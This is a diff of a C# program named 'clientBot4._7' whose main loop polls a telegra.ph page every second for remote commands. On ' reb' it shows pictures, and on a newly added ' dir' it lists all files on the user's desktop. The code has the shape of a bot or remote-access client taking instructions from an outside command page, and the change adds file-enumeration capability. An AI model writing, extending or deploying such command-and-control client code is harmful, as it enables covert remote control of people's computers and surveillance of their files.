@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -15,16 +16,24 @@ namespace clientBot4._7
         [STAThread]
         static void Main()
         {
+            BotFunctions bt = new BotFunctions();
             while (true)
             {
+                Thread.Sleep(1000);
                 WebCommand wc = new WebCommand("https://telegra.ph/Tets-09-14");
                 Console.WriteLine(wc.command);
                 if (wc.command == " reb")
                 {
-                    BotFunctions bt = new BotFunctions();
                     bt.ShowPrettyPictures();
                 }
+                if (wc.command == " dir")
+                {
+                    bt.GetAllFilesOnDesktop();                    
+                }
             }
+
+
+
             
         }
     }
